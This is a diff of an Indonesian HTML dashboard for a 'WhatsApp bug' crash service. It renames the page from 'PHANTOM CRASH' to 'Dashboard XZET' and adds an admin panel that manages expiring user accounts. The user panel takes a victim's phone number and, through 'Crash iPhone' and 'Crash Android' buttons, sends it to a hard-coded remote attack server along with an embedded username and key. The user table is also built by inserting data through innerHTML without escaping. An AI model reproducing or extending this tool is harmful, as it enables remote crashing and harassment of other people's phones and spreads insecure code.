@@ -2,66 +2,107 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>PHANTOM CRASH</title>
-  <style>
-    body {
-      background: url("https://files.catbox.moe/0my149.jpg") no-repeat center center fixed;
-      background-size: cover; color: white;
-      font-family: Arial, sans-serif; text-align: center;
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      height: 100vh;
-    }
-    .container {
-      background: rgba(0,0,0,0.7); padding: 30px 20px; border-radius: 12px;
-      max-width: 500px; width: 90%;
-    }
-    input {
-      width: 100%; margin: 10px 0; padding: 10px;
-      background: #1e1e1e; color: white; border: none; border-radius: 6px;
-    }
-    button {
-      padding: 10px 20px; margin: 10px 5px;
-      background: #2b3f5c; color: white; border: none; border-radius: 6px; cursor: pointer;
-    }
-    .logout { position: fixed; top: 15px; right: 15px; }
-    .links { position: fixed; bottom: 20px; display: flex; gap: 10px; }
-  </style>
+  <title>Dashboard XZET</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="logout"><button onclick="logout()">Logout</button></div>
-  <div class="container">
-    <h2>💥 Menu Bug WhatsApp</h2>
-    <input id="target" placeholder="Nomor target 62xxxx">
-    <button onclick="sendBug('ios')">Crash iPhone</button>
-    <button onclick="sendBug('android')">Crash Android</button>
-    <p id="status"></p>
+  <div class="top-bar">
+    <span id="welcome"></span>
+    <button onclick="logout()">Logout</button>
   </div>
-  <div class="links">
-    <a href="https://t.me/Hikamaruci" target="_blank"><button>👑 Owner</button></a>
-    <a href="https://t.me/infocosmox" target="_blank"><button>📣 Channel</button></a>
+
+  <div id="adminPanel" class="hidden">
+    <h2>👑 Admin Panel</h2>
+    <div>
+      <input type="text" id="newUser" placeholder="Username baru" />
+      <input type="text" id="newPass" placeholder="Password baru" />
+      <input type="number" id="newExpire" placeholder="Expired (hari)" />
+      <button onclick="createUser()">Create User</button>
+    </div>
+    <h3>Daftar User</h3>
+    <table id="userTable">
+      <thead>
+        <tr><th>Username</th><th>Role</th><th>Expired</th><th>Aksi</th></tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <div id="userPanel" class="hidden">
+    <h2>💥 Menu Bug</h2>
+    <input type="text" id="target" placeholder="Masukkan nomor target 62xxxx" />
+    <button onclick="attack('ios')">Crash iPhone</button>
+    <button onclick="attack('andros')">Crash Android</button>
   </div>
 
   <script>
-    if (!localStorage.getItem("loggedIn")) window.location.href = "index.html";
+    const role = localStorage.getItem("role");
+    const username = localStorage.getItem("username");
 
-    function logout() {
-      localStorage.removeItem("loggedIn");
-      window.location.href = "index.html";
+    if (!role || !username) window.location.href = "/";
+
+    document.getElementById("welcome").textContent = `Halo, ${username} (${role})`;
+
+    if (role === "admin") {
+      document.getElementById("adminPanel").classList.remove("hidden");
+      loadUsers();
+    } else {
+      document.getElementById("userPanel").classList.remove("hidden");
     }
 
-    async function sendBug(mode) {
+    async function loadUsers() {
+      const res = await fetch("/api/getUsers");
+      const users = await res.json();
+      const tbody = document.querySelector("#userTable tbody");
+      tbody.innerHTML = "";
+      users.forEach(u => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${u.username}</td>
+          <td>${u.role}</td>
+          <td>${u.expired ? new Date(u.expired).toLocaleDateString() : "-"}</td>
+          <td><button onclick="deleteUser('${u.username}')">Hapus</button></td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    async function createUser() {
+      const username = document.getElementById("newUser").value.trim();
+      const password = document.getElementById("newPass").value.trim();
+      const days = parseInt(document.getElementById("newExpire").value.trim() || "7");
+      const expiredDate = new Date();
+      expiredDate.setDate(expiredDate.getDate() + days);
+
+      const res = await fetch("/api/updateUsers", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "create", username, password, expired: expiredDate })
+      });
+
+      if (res.ok) loadUsers();
+    }
+
+    async function deleteUser(user) {
+      await fetch("/api/updateUsers", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "delete", username: user })
+      });
+      loadUsers();
+    }
+
+    function logout() {
+      localStorage.clear();
+      window.location.href = "/";
+    }
+
+    async function attack(mode) {
       const target = document.getElementById("target").value.trim();
       if (!target.startsWith("62")) return alert("Nomor harus 62xxxx");
-      const url = mode === "ios"
-        ? `http://170.64.161.133:1905/execution?target=${target}&mode=ios&username=Bancet&key=W4BT`
-        : `http://170.64.161.133:1905/execution?target=${target}&mode=andros&username=Bancet&key=W4BT`;
-      document.getElementById("status").textContent = "⏳ Mengirim bug...";
-      try {
-        const res = await fetch(url);
-        document.getElementById("status").textContent = res.ok ? "✅ Bug terkirim!" : "❌ Gagal kirim bug!";
-      } catch {
-        document.getElementById("status").textContent = "❗ Gagal mengirim bug!";
-      }
+      const url = `http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`;
+      await fetch(url);
+      alert(`Berhasil kirim bug ke ${target} (${mode})`);
     }
   </script>
 </body>
